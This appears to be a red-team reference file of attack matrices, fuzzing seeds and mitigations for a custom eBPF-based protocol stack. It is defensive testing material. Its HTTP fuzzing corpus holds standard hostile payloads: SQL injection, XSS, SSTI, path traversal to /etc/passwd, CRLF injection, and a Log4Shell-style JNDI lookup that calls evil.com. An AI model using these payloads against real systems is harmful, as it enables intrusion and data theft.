# The Dark Grimoire — Protocol Attack Vectors

*The complete adversarial reference for the Unheaded Protocol stack.*

Read this reference file when planning protocol-specific attack campaigns, designing fuzzing harnesses for Monad/Sophia/Wotan, or conducting red team exercises against the protocol layer.

---

## Table of Contents

1. [Monad Wire Format Attack Matrix](#monad-wire-format-attack-matrix)
2. [Sophia BPF Map Attack Matrix](#sophia-bpf-map-attack-matrix)
3. [Wotan Memory Model Attack Matrix](#wotan-memory-model-attack-matrix)
4. [Shield eBPF Pipeline Attack Matrix](#shield-ebpf-pipeline-attack-matrix)
5. [Anamnesis Event System Attack Matrix](#anamnesis-event-system-attack-matrix)
6. [Kingdom Mode Attack Matrix](#kingdom-mode-attack-matrix)
7. [Cross-Protocol Attack Chains](#cross-protocol-attack-chains)
8. [Fuzzing Corpus Templates](#fuzzing-corpus-templates)
9. [CRC-16/CCITT Attack Patterns](#crc-16-ccitt-attack-patterns)
10. [IPv6 HbH Extension Header Attacks](#ipv6-hbh-extension-header-attacks)

---

## Monad Wire Format Attack Matrix

### Register Structure (20 bytes)

```
Offset  Size  Field     Valid Range       Attack Values
──────  ────  ────────  ───────────────   ─────────────────────────────
0x00    1     Version   0x01 (current)    0x00, 0xFF, 0x02-0xFE
0x01    1     Flags     defined bits      reserved bits set, all 1s, all 0s
0x02    2     Dict ID   valid dict range  0x0000, 0xFFFF, unregistered IDs
0x04    2     Field ID  valid field range 0x0000, 0xFFFF, out-of-dict fields
0x06    12    Value     varies by field   see exponent encoding attacks
0x12    2     CRC-16    computed          see CRC attack patterns
```

### Version Field Attacks

| Attack | Input | Expected Behavior | Bug If... |
|--------|-------|-------------------|-----------|
| Zero version | `0x00` | Reject with error | Panic, nil deref, fall-through |
| Future version | `0x02` | Reject or forward-compat | Process as current version |
| Max version | `0xFF` | Reject with error | Integer overflow in version check |

### Flags Field Attacks

| Attack | Input | Expected Behavior | Bug If... |
|--------|-------|-------------------|-----------|
| Reserved bits set | `0b11110000` | Ignore reserved or reject | Reserved bits affect processing |
| All bits set | `0xFF` | Process defined, ignore rest | Undefined behavior |
| Contradictory flags | depends on spec | Reject | Both "read-only" and "write" set |

### Dict ID / Field ID Attacks

| Attack | Input | Expected Behavior | Bug If... |
|--------|-------|-------------------|-----------|
| Unregistered dict | `0xDEAD` | Reject with error | Nil map lookup, panic |
| Field beyond dict size | `0xFFFF` | Reject with error | Array bounds violation |
| Dict 0 / Field 0 | `0x0000` | Depends on spec | Zero used as sentinel |
| Valid dict, invalid field | mixed | Reject | Partial processing before rejection |

### Exponent Encoding Attacks (12-byte Value Field)

| Attack | Input | Expected Behavior | Bug If... |
|--------|-------|-------------------|-----------|
| Max exponent | `exp = 0xFF` | Handle large value | Integer overflow |
| Zero exponent | `exp = 0x00` | Handle small value | Division by zero |
| Negative-equivalent | sign bit patterns | Handle correctly | Signed/unsigned confusion |
| All zeros | 12x `0x00` | Valid zero value | Special-cased incorrectly |
| All ones | 12x `0xFF` | Handle max value | Overflow in computation |
| NaN-like pattern | IEEE 754 NaN bits | Reject or handle | Propagate NaN through calcs |
| Denormalized | subnormal bits | Handle correctly | Loss of precision, wrong result |

---

## Sophia BPF Map Attack Matrix

### Map Operations

| Attack | Technique | Expected Behavior | Bug If... |
|--------|-----------|-------------------|-----------|
| Map exhaustion | Fill to `max_entries` | Return `-ENOSPC` | OOM, kernel panic, silent drop |
| Key collision | Craft hash-colliding keys | Handle collision chain | DoS via hash flooding, O(n) lookup |
| Concurrent write | Parallel `bpf_map_update_elem` | Atomic or serialized | Torn read, corrupt value |
| Type confusion | Wrong value size | Reject | Buffer overread/overwrite |
| Delete during iterate | `bpf_map_delete_elem` mid-iteration | Consistent view | Use-after-free, skip entries |
| Unpin while referenced | `bpf_obj_unpin` with active programs | Refcount prevents | Dangling reference, use-after-free |
| Cross-CPU race | Update on CPU 0, read on CPU 1 | Per-CPU or locked | Stale read, inconsistent state |

### Dictionary Versioning Attacks

| Attack | Technique | Expected Behavior | Bug If... |
|--------|-----------|-------------------|-----------|
| Rollback | Load old dictionary version | Reject or migrate | Old fields parsed with new schema |
| Hot swap | Replace dictionary during traffic | Atomic swap | Mixed old/new interpretation |
| Schema mismatch | Dict says "int", value is "string" | Type validation | Parse garbage as valid |
| Circular reference | Dict A refs Dict B refs Dict A | Detect and reject | Infinite loop, stack overflow |

---

## Wotan Memory Model Attack Matrix

### Register Access Patterns

| Attack | Technique | Expected Behavior | Bug If... |
|--------|-----------|-------------------|-----------|
| Buffer overflow | Write past 20-byte boundary | Bounds check prevents | Overwrite adjacent memory |
| Use-after-free | Read register after release | Error return | Access freed memory |
| Double free | Release same register twice | Idempotent or error | Heap corruption |
| Integer overflow | Size calc: `offset + len > 20` | Safe math prevents | Wrapping allows out-of-bounds |
| Unaligned access | Read u32 at offset 3 | Aligned access or memcpy | Bus error on strict arch |
| Concurrent access | Two BPF programs, one register | Lock or per-CPU copy | Race condition, torn read |
| Helper chaining | Call read → modify → write in wrong order | State machine enforces | Inconsistent state |
| Null register | Pass NULL to helper | NULL check prevents | Kernel NULL deref |

---

## Shield eBPF Pipeline Attack Matrix

### Verifier Attacks

| Attack | Technique | Expected Behavior | Bug If... |
|--------|-----------|-------------------|-----------|
| Complexity bomb | Program with MAX instructions | Reject at limit | Verifier timeout, DoS |
| Dead code hiding | Unreachable code does bad things | Verifier prunes it | Dead code executed via JIT bug |
| Register type confusion | Exploit verifier type tracking | Type safety holds | Wrong type allows bad access |
| Speculative execution | Spectre-like BPF attack | Mitigated | Side channel leak |
| Tail call loop | A → B → A infinite | Depth limit enforced | Stack overflow, kernel hang |
| Map-of-maps confusion | Nested map type abuse | Type checking holds | Inner map type mismatch |
| BTF mismatch | Wrong BTF for kernel | BTF validation | Incorrect struct offsets |

### Program Loading Attacks

| Attack | Technique | Expected Behavior | Bug If... |
|--------|-----------|-------------------|-----------|
| Oversized program | Exceed `BPF_MAXINSNS` | Reject | Memory exhaustion |
| Malformed instructions | Invalid opcodes | Reject at verification | Crash in JIT |
| Privileged helper call | Unprivileged program calls root helper | Reject | Privilege escalation |
| Map FD smuggling | Pass wrong map FD | FD validation | Access to other maps |

---

## Anamnesis Event System Attack Matrix

| Attack | Technique | Expected Behavior | Bug If... |
|--------|-----------|-------------------|-----------|
| Ring buffer overflow | Produce events faster than consume | Drop oldest or block | Memory corruption, crash |
| Event forgery | Craft fake events | Authentication/signing | Tampered history accepted |
| Timestamp manipulation | Clock skew, NTP attack | Monotonic clock | Out-of-order events break ordering |
| Event replay | Replay old events | Deduplication/sequence numbers | State corruption |
| Large event payload | Event exceeding buffer entry size | Reject or fragment | Buffer overwrite |

---

## Kingdom Mode Attack Matrix

| Attack | Technique | Expected Behavior | Bug If... |
|--------|-----------|-------------------|-----------|
| Split brain | Network partition during mode switch | Consensus prevents | Two sovereigns, state divergence |
| Rapid mode toggle | Sovereign → Vassal → Sovereign fast | Rate limiting/debounce | Race condition, state corruption |
| Stale mode | Node thinks sovereign, others disagree | Heartbeat/lease expiry | Stale node serves bad state |
| Mode during migration | Switch mode while data migrating | Defer or abort | Partial migration, data loss |

---

## Cross-Protocol Attack Chains

The most dangerous attacks chain multiple protocol components:

### Chain 1: Monad → Sophia → Wotan
```
1. Forge Monad register with valid CRC but malicious Dict ID
2. Sophia looks up non-existent dictionary → returns unexpected value
3. Wotan helper receives unexpected value → memory safety violation
IMPACT: Potential kernel-level memory corruption
```

### Chain 2: Shield → Anamnesis → Kingdom Mode
```
1. Load BPF program that generates flood of events
2. Anamnesis ring buffer overwhelmed → events lost
3. Lost events include mode transition → split brain
IMPACT: Cluster state divergence, data inconsistency
```

### Chain 3: Sophia → Shield → Network
```
1. Poison Sophia dictionary with crafted field mapping
2. Shield's packet marker reads poisoned mapping → wrong header injection
3. Downstream nodes misinterpret headers → traffic misdirection
IMPACT: Network-level traffic manipulation via map poisoning
```

---

## Fuzzing Corpus Templates

### Monad Register Corpus (Seed Inputs)

```
# Valid register (baseline)
01 00 00 01 00 01 [12 bytes value] [2 bytes CRC]

# Boundary values
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  # all zeros
FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  # all ones

# Truncated
01                                                            # 1 byte only
01 00                                                         # version + flags only
01 00 00 01                                                   # through dict ID
01 00 00 01 00 01                                             # through field ID
01 00 00 01 00 01 00 00 00 00 00 00 00 00 00 00 00 00        # no CRC

# Oversized
01 00 00 01 00 01 [12 bytes] [2 CRC] [extra garbage bytes]   # trailing data
```

### HTTP API Corpus (Seed Inputs)

```
# Standard payloads for every text input
' OR '1'='1' --                    # SQL injection
<script>alert(1)</script>           # XSS
{{7*7}}                             # SSTI
${jndi:ldap://evil.com/x}          # Log4Shell-style
../../../etc/passwd                  # Path traversal
%00                                 # Null byte injection
\r\nInjected-Header: value         # CRLF injection
```

---

## CRC-16/CCITT Attack Patterns

| Attack | Description | Purpose |
|--------|-------------|---------|
| CRC collision | Two different payloads, same CRC | Bypass integrity check |
| Zero CRC | CRC field = 0x0000 | Test if zero is special-cased |
| CRC of empty | CRC computed over zero-length data | Edge case in CRC function |
| Wrong polynomial | CRC computed with CRC-16/IBM instead of CCITT | Interop confusion |
| Bit-flip enumeration | Flip each bit in valid packet, recompute CRC | Find which bits aren't covered |
| Length extension | Append data and forge extended CRC | Classic CRC weakness |

---

## IPv6 HbH Extension Header Attacks

| Attack | Description | Purpose |
|--------|-------------|---------|
| Malformed option length | Option says 200 bytes, only 10 present | Buffer overread |
| Zero-length option | Option with `len = 0` | Off-by-one, infinite loop |
| Nested extension headers | HbH → Routing → HbH (forbidden by RFC) | Parser confusion |
| Jumbogram interaction | HbH option + Jumbogram payload option | Size calculation overflow |
| Option type bits | Highest bits control "unrecognized" behavior | Force different code paths |
| Pad1/PadN confusion | Padding options with data in pad bytes | Information leak |
| Fragment + HbH | Fragmented packet with HbH in first fragment only | Reassembly confusion |

---

## 11. Doom-Specific Attack Surface (Computational Completeness)

Section 12 of the Monad spec creates a Turing-complete system: packets as CPU, Wotan as RAM. The Doom PoC is the ultimate stress test — if the protocol can run a game at 35 FPS without corrupting state, production telemetry is safe. Every bug in Doom IS a protocol bug.

### MBC Bytecode Injection (D1 — CRITICAL)

| Attack | Technique | Impact |
|--------|-----------|--------|
| ROM_MAP replacement | Attacker replaces ROM instructions via compromised wotan-ctl | Arbitrary compute in XDP context |
| Instruction mutation | Flip bits in ROM_MAP BPF array | Corrupted MBC execution, undefined behavior |
| Opcode extension | Inject invalid MBC opcodes (>SYSCALL) | Parser confusion, potential OOB in instruction dispatch |

**Mitigation:** HMAC-SHA256 on ROM_MAP contents. Verify signature in `wotan-ctl load-rom`. BPF LSM hook on map updates.

### Framebuffer Exfiltration (D2 — HIGH)

| Attack | Technique | Impact |
|--------|-----------|--------|
| Topic subscription | Subscribe to `compute.screen.*` | Read screen state (information disclosure) |
| Wotan ACL bypass | Exploit missing topic ACLs | Unauthorized access to display buffer |

**Mitigation:** Wotan topic ACLs. Require Shield authority token for `compute.*` topics.

### Keyboard Injection (D3 — HIGH)

| Attack | Technique | Impact |
|--------|-----------|--------|
| Topic publish | Publish to `compute.input.*` | Control game input (integrity violation) |
| Input replay | Record and replay input sequences | Deterministic state manipulation |

**Mitigation:** Wotan topic ACLs + per-publisher authentication.

### Flow Label Collision (D4 — HIGH)

| Attack | Technique | Impact |
|--------|-----------|--------|
| Birthday attack | 20-bit flow label = ~1000 flows for 50% collision | CPU_MAP state overwritten by different flow |
| Targeted collision | Craft packet with known Doom flow label | Direct CPU state corruption |

**Mitigation:** Extend L1 cache key to composite: flow_label + src/dst IP hash (Finding W2).

### SYSCALL Handler Abuse (D5 — MEDIUM)

| Attack | Technique | Impact |
|--------|-----------|--------|
| Crafted SYSCALL opcode | Construct MBC program with malicious SYSCALL operands | Unintended Wotan I/O (screen write, kbd read) |
| SYSCALL enumeration | Iterate all SYSCALL numbers, observe side effects | Map the syscall interface |

**Mitigation:** Whitelist allowed SYSCALL numbers. Restrict I/O to specific Wotan topics per-flow.

### ROM Integrity (D6 — MEDIUM)

| Attack | Technique | Impact |
|--------|-----------|--------|
| Unsigned ROM load | `wotan-ctl load-rom` accepts unsigned binary | Load arbitrary MBC code |
| ROM race | Replace ROM_MAP between verification and execution | TOCTOU on ROM integrity |

**Mitigation:** Sign ROM with ML-DSA-65. Verify at load time AND pin-time. Immutable after load.

---

## 12. Cross-Document Consistency Attacks

A NEW attack vector class discovered in S21: inconsistencies BETWEEN protocol specs create exploitable gaps that no single-spec review would find.

### Cross-Spec Gap Matrix

| # | Finding | Specs Involved | Severity | Attack |
|---|---------|---------------|----------|--------|
| X1 | No canonical exponent→value mapping table | Monad §5.4, Sophia, wire-format-patterns | CRITICAL | Endpoints interpret same bits differently → silent data corruption |
| X2 | Version field width mismatch | Monad §2.2 (8-bit), IANA guide (4-bit) | HIGH | Version values 0x10-0xFF: wire allows them, IANA doesn't govern them |
| X3 | Circuit state encoding ambiguity | Monad §5.4 (exponent), IANA (raw?) | HIGH | Same byte value decoded two different ways depending on which spec you read |
| X4 | IANA flow action gap (0x17-0xEF) | IANA guide (231 values, no policy) | HIGH | 231 unallocated values = undefined behavior space |

### Why This Matters

Traditional security review audits ONE document at a time. Cross-document attacks exploit the SEAMS between specs — places where Spec A assumes X but Spec B assumes Y. The Black Mage must always review the intersections, not just the interiors.

### Audit Methodology

For every field that appears in multiple specs:
1. Check that the valid range is identical across all specs
2. Check that the encoding is identical (raw vs exponent vs varint)
3. Check that the IANA allocation covers the full valid range
4. Check that edge values (0, MAX, boundary) are handled consistently

---

## 13. IANA Registry Attacks

Unique to standards-track protocols: the IANA registry itself is an attack surface.

| Attack | Technique | Impact |
|--------|-----------|--------|
| Option type squatting | Register TLV types before policy defined | Block legitimate extensions |
| Allocation gap exploitation | Use unallocated values (0x17-0xEF flow action range) | Undefined behavior, implementation-dependent |
| Designated expert absence | Submit without review | Bypass quality gate |
| Greasing failure | Never send unknown types → ossification | Implementations break on first extension |
| TLV type collision | Monad TLV overlaps IPv6 HbH option numbers | Cross-protocol confusion |
| Registry poisoning | Compromise IANA submission process | Legitimate-looking malicious registrations |

**Mitigation:** Define allocation policy for ALL value ranges. Designate experts. Cross-check against IPv6 HbH option numbers. Mandate greasing (0x80-0xFF random padding) from day one.

---

## 14. Concurrency Primitives Audit

The S20 race condition (BPF `get_ptr_mut` TOCTOU) revealed that concurrent mutable access to shared state is a SYSTEMIC pattern across the protocol stack. This is the most important audit checklist in the grimoire — every entry is a potential race condition.

### The Checklist

```
CONCURRENCY PRIMITIVES — AUDIT EVERY ONE
─────────────────────────────────────────
□ Every get_ptr_mut()          → Lock? CAS? Stack copy? Optimistic retry?
□ Every bpf_map_update_elem()  → Concurrent readers? RCU grace period?
□ Every Sophia hot-swap        → Encoder/decoder ACK? Version epoch bit?
□ Every multi-packet flow      → Can packets overlap in ring? Sequence counter?
□ Every L1 cache line access   → BPF spinlock? Per-CPU copy? HMAC validation?
□ Every WAL write              → Exclusive lock during compaction? Seqno monotonic?
□ Every ring buffer write      → Backpressure signal? Drop-rate monitoring?
□ Every dictionary lookup      → table_version validated? Grace period active?
□ Every control topic publish  → Wotan ordering guarantee? Idempotent consumer?
□ Every flow state mutation    → Flow sequence counter incremented? CAS on state?
```

### Why Every Entry Matters

The S20 race was found because Doom PoC runs ~5,600 packets/second through a 6-hop ring — that's ~33,600 state mutations per second hitting the same BPF maps. At that rate, even a nanosecond race window becomes exploitable. The same patterns exist in production: high-throughput telemetry flows will hit the same races at scale.

---

## 15. QUIC + HTTP/3 Cross-Pollination Attack Matrix

RFC 9000 (QUIC) §21 and RFC 9114 (HTTP/3) §10 define 17 attack classes. ALL of them apply to Unheaded. This is the complete mapping.

### Transport-Layer Attacks (from QUIC §21)

| # | Attack Class | QUIC Mitigation | Unheaded Exposure | Unheaded Mitigation |
|---|-------------|-----------------|-------------------|---------------------|
| Q1 | Amplification via reflection | 3× limit before address validation | 6-255× ring amplification | Ring path counter (max 3×) |
| Q2 | Handshake flooding | Retry tokens + address validation | Shield allocates state immediately | Shield-Retry HMAC tokens |
| Q3 | Request forgery (cross-protocol) | ALPN identification | Monad HbH could be confused | Reserved field check (4-bit = 0) |
| Q4 | Stream commitment | MAX_STREAM_DATA credits | Sophia dict unbounded | Per-flow 1MB, global 100MB limits |
| Q5 | Peer DoS (resource exhaustion) | Credit-based flow control | Wotan per-flow unbounded | BPF map limits + backpressure |
| Q6 | Stateless reset oracle | 16-byte reset token | No reset mechanism | GOAWAY + per-flow reset token |
| Q7 | Replay attack | Packet numbers + AEAD | CRC-16 = no replay protection | HMAC-SHA256 + sequence counters |
| Q8 | Retry token forgery | HMAC-validated tokens | No tokens exist | Shield-Retry with HMAC-SHA256 |
| Q9 | Version downgrade | Version Negotiation packet | "Drop unknown" is safe | Define version negotiation for future |
| Q10 | Timing side-channel | Constant-time crypto | Chaos injection leaks timing | Restrict C flag + constant-time ops |
| Q11 | Connection migration abuse | CID sequence numbers + validation | Flow Label static | Flow migration tokens (Q5) |

### Application-Layer Attacks (from HTTP/3 §10)

| # | Attack Class | HTTP/3 Mitigation | Unheaded Exposure | Unheaded Mitigation |
|---|-------------|-------------------|-------------------|---------------------|
| H1 | CRIME/BREACH (compression) | Separate compression contexts | If Sophia values compressed | Separate trusted/untrusted contexts |
| H2 | Control plane starvation | Dedicated control stream | All flows uniform (no priority) | Typed flows: CONTROL/DATA/PREFETCH |
| H3 | State desynchronization | QPACK encoder/decoder ACK | Sophia hot-swap race (S20) | QPACK-style ACK protocol |
| H4 | Request smuggling | Strict framing, no Transfer-Encoding | Anamnesis event boundaries | Fixed 64-byte events + strict validation |
| H5 | Extension DoS | Frame limits, unknown type ignore | No extension framework | TLV max 4 per Monad, O(1) skip |
| H6 | Shutdown ambiguity | GOAWAY with monotonic stream ID | No GOAWAY mechanism | Monotonic GOAWAY + drain timeout |

---

*The Grimoire is never complete. Every attack discovered adds a page. Every defense broken adds a chapter. Every RFC cross-pollinated adds a volume. The Dark Mage reads. The Dark Mage learns. The Dark Mage returns stronger.*

*S21 addendum: +6 Doom attack vectors, +4 cross-document gaps, +6 IANA registry attacks, +10 concurrency audit items, +17 cross-pollination attack classes. The Grimoire grows.*
